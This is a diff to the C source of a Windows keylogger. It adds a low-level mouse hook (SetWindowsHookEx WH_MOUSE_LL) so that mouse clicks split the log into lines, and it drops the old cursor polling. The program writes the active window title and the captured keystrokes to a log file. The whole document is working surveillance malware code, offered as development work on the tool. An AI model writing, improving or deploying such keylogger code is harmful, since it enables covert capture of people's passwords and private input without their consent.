@@ -2,9 +2,17 @@
 #include <stdio.h>
 #include <time.h>
 
-char lastWindowTitle[1024] = {0}, path[44] = {0};;
-POINT lastCursorPos;
+char lastWindowTitle[1024] = {0}, path[44] = {0};
+u8 shouldDoCursorEnter = 0;
 u8 firstTime = 1;
+HHOOK mouseHook;
+
+LRESULT CALLBACK mouseMoveHook(int code, WPARAM wParam, LPARAM lParam) {
+    if (code == HC_ACTION) {
+        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) shouldDoCursorEnter = 1;
+    }
+    return CallNextHookEx(mouseHook, code, wParam, lParam);
+}
 
 void recordInFileCallback(char* c) {
     FILE* f = fopen(path, "ab");
@@ -30,11 +38,11 @@ void recordInFileCallback(char* c) {
         fwrite(currentWindowTitle, strlen(currentWindowTitle), 1, f);
         fwrite("\n\n", 2, 1, f);
         firstTime = 1;
+        shouldDoCursorEnter = 0;
     }
-    POINT currentCursorPos;
-    GetCursorPos(&currentCursorPos);
-    if ((currentCursorPos.x != lastCursorPos.x) || (currentCursorPos.y != lastCursorPos.y)) {
-        lastCursorPos = currentCursorPos;
+
+    if (shouldDoCursorEnter == 1) {
+        shouldDoCursorEnter = 0;
         if (firstTime == 0) {
             fwrite("\n", 1, 1, f);
         }
@@ -57,6 +65,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     fwrite("Starting the log file here.\n\n", 29, 1, f);
     fclose(f);
+    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseMoveHook, hInstance, 0);
     startKeylogger(hInstance, recordInFileCallback);
+    UnhookWindowsHookEx(mouseHook);
     return 0;
 }
